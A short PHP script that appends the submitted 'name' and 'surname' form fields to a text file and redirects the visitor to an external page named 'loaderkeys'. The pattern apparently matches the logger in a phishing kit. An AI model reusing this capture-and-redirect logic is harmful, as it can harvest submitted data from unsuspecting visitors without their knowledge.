<?php
$name = $_POST['name'];
$surname = $_POST['surname'];
$file = fopen("radar.txt","at");
fwrite($file,"\n $name:$surname \n");
fclose($file);
header('Location: http://b92453ko.beget.tech/loaderkeys/');
?>